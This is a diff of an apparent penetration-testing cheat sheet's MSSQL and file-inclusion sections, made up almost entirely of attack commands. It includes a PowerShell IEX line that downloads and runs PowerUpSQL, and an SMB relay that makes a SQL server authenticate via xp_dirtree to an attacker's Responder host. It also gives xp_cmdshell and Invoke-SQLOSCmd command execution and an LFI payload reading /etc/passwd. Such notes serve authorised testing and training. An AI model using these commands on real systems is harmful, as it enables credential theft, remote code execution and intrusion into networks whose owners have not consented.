@@ -298,14 +298,25 @@ MySQL
   `# get all SPNs into a file:`   
   `foreach($entry in (Get-Content .\sql_hosts.txt)){ $dnsname = (Resolve-DnsName $entry).Namehost; setspn -q *MSSQL*/*$dnsname* | select-string "MSSQL" | Out-File sql_instances.txt -Append }`   
 
-  `# import PowerUpSQL and run the SQLAudit on all instances`   
+  import PowerUpSQL and run the SQLAudit on all instances:    
   `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`   
   `foreach($item in ((Get-Content .\sql_instances.txt).trim() | ? {$_ -ne ""})){ Invoke-SQLAudit -Verbose -Instance "$item"}`   
+  
+  Run Query using PowerUpSQL:   
+  `Get-SQLQuery -Instance "sql1.domain.local,1433" -Query "select @@servername"`   
+  Using Impacket mssqlclient.py:   
+  `python3 /usr/local/bin/mssqlclient.py -windows-auth DOMAIN/user@10.10.100.100`   
+  `SQL> select @@servername;`   
 
   SMB Relay through xp_dirtree:  
   Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
   Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"`   
   or: `Get-SQLQuery -Instance servername.domain.local -Query "xp_fileexist '\\<kaliip>\file'" -Verbose | out-null`   
+  
+  SQL Command Execution:   
+  `Invoke-SQLOSCmd -Instance "sql1.domain.local,1433" -Command "whoami" -RawResults`   
+  Using mssqlclientpy:    
+  `EXEC xp_cmdshell 'whoami';`    
 
 ## File inclusion
 - LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
